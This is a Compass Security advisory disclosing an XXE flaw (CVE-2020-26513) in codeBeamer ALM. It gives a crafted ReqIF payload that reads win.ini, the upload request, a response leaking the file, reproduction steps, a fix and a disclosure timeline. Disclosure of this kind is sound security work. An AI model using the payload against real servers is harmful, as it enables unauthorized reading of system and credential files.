@@ -1,0 +1,171 @@
+#############################################################
+#
+# COMPASS SECURITY ADVISORY
+# https://www.compass-security.com/research/advisories/
+#
+#############################################################
+#
+# Product:  codeBeamer Application Lifecycle Management (ALM) [1]
+# Vendor:   Intland Software
+# CSNC ID:  CSNC-2020-008
+# CVE ID:   CVE-2020-26513
+# Subject:  XML External Entity Resolution (XXE)
+# Risk:     High
+# Effect:   Remotely exploitable
+# Author:   Alex Joss and Emanuele Barbeno (advisories@compass-security.com)
+# Date:     07.12.2020
+#
+#############################################################
+
+Introduction:
+-------------
+codeBeamer Application Lifecycle Management (ALM) provides Project-, Task-, 
+Requirement-, Test- Change-, Configuration-, Build-, Knowledge- and Document 
+management in a single, secure environment. It enables software and hardware 
+development to be more collaborative, transparent and productive. [2]
+
+ReqIF XML data is parsed by insecurely configured software components, which 
+can be abused for XML External Entity Attacks. [3]
+
+Affected:
+---------
+Vulnerable:
+	10.0.0-final
+	10.1.0-final
+	10.1.SP4
+
+Not Vulnerable:
+	20.11-lts
+
+No other version was tested, but it is believed for the older versions to be 
+vulnerable as well.
+
+Technical Description
+---------------------
+The XML parser used to read the ReqIF file content is not configured to deny 
+the resolution of external entities. 
+Special crafted ReqIF files, which trigger the deserializaiton of entities, 
+can be used to trigger XXE attacks.
+
+In order to find a valid ReqIF file, it is possible to use the Export feature 
+accessible by clicking on the following
+links:
+	"Projects" -> select one project where the logged-in user has admin rights 
+	-> "Admin" -> "Export"
+
+Here the modified ReqIF file used to read the content of the 
+C:\Windows\win.ini file:
+```
+<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE Document [
+  <!ENTITY c SYSTEM "file:///c:/windows/win.ini">
+]>
+<REQ-IF xmlns="http://www.omg.org/spec/ReqIF/20110401/reqif.xsd" 
+	xmlns:xml="http://www.w3.org/XML/1998/namespace" 
+	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+	xmlns:reqif="http://www.omg.org/spec/ReqIF/20110401/reqif.xsd" 
+	xmlns:reqif-xhtml="http://www.w3.org/1999/xhtml" 
+	xmlns:reqif-common="http://www.prostep.org/reqif" 
+	xsi:schemaLocation="http://www.omg.org/spec/ReqIF/20110401/reqif.xsd 
+	http://www.omg.org/spec/ReqIF/20110401/reqif.xsd" 
+	xml:lang="en">
+  <THE-HEADER>
+    <REQ-IF-HEADER IDENTIFIER="CB-WIN-02-00-4C-4F-4F-50-2-1588835489663">
+      <COMMENT>&c;</COMMENT>
+      <CREATION-TIME>2020-05-07T00:11:29-07:00</CREATION-TIME>
+[CUT-BY-COMPASS]
+```
+
+The ReqIF file above has been zipped and the extension has been changed 
+from .zip to .reqifz
+
+After logging in to the codeBeamer application, reach the Import functionality 
+by clicking on the following links:
+	"Projects" -> select one project where the logged-in user has admin rights 
+	-> "Admin" -> "Import" -> "Import ReqIF…"
+
+By selecting the generated .reqifz file, the following request is sent:
+```
+POST /cb/ajax/project/2/uploadReqIF.spr HTTP/1.1
+Host: codebeamer.local:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; 
+		boundary=---------------------------113369293913002634562735685816
+Content-Length: 2866
+Origin: http://codebeamer.local:8080
+DNT: 1
+Connection: close
+Referer: http://codebeamer.local:8080/cb/proj/admin.spr?proj_id=2
+Cookie: JSESSIONID=[CUT-BY-COMPASS]; CB_LOGIN=[CUT-BY-COMPASS]
+
+-----------------------------113369293913002634562735685816
+Content-Disposition: form-data; name="file"; filename="lfi-xxe.reqifz"
+Content-Type: application/octet-stream
+
+PK
+[CUT-BY-COMPASS]
+-----------------------------113369293913002634562735685816--
+```
+
+And the following response is received. The content of the C:\Windows\win.ini 
+file is present in the "description" and "COMMENT" response fields:
+```
+HTTP/1.1 200 
+X-XSS-Protection: 1
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Cache-Control: no-store
+Content-Type: application/json;charset=UTF-8
+Content-Language: en-US
+Content-Length: 200023
+Date: Thu, 07 May 2020 07:40:35 GMT
+Connection: close
+
+{
+  "importConfig" : {
+    "name" : "test",
+    "description" : "; for 16-bit app support\n[fonts]\n[extensions]\n[mci 
+		extensions]\n[files]\n[Mail]\nMAPI=1\n",
+    "reqIF" : {
+      "IDENTIFIER" : "CB-WIN-02-00-4C-4F-4F-50-2-1588835489663",
+      "COMMENT" : "; for 16-bit app support\n[fonts]\n[extensions]\n[mci 
+		extensions]\n[files]\n[Mail]\nMAPI=1\n",
+      "CREATION-TIME" : "2020-05-07T00:11:29-07:00",
+      "REPOSITORY-ID" : "CB-WIN-02-00-4C-4F-4F-50-2",
+      "REQ-IF-TOOL-ID" : "Intland CodeBeamer 10.0.0-final",
+      "REQ-IF-VERSION" : "1.0",
+      "SOURCE-TOOL-ID" : "Intland CodeBeamer 10.0.0-final",
+      "TITLE" : "test",
+      "CONVERSATION-ID" : "ee46816f-a88f-45f5-bcbd-d930ee3e9c51"
+    },
+    "items" : [ {
+[CUT-BY-COMPASS]
+```
+
+Workaround / Fix:
+-----------------
+The vulnerability is a result of a weakly configured/parameterized XML parser [3]. 
+The parser needs to be hardened by changing settings in the configuration or 
+parameters in the code. It must not allow the use of inline DTDs and external 
+entities.
+
+
+Timeline:
+---------
+2020-05-14:     Discovery by Alex Joss and Emanuele Barbeno
+2020-05-18:     Initial vendor notification
+2020-05-18:     Initial vendor response
+2020-10-02:     Assigned CVE-2020-26513
+2020-12-01:		Patched version released
+2020-12-07:     Public disclosure
+
+
+References:
+-----------
+[1] https://intland.com/codebeamer/application-lifecycle-management/
+[2] https://codebeamer.com/cb/wiki/199594
+[3] https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
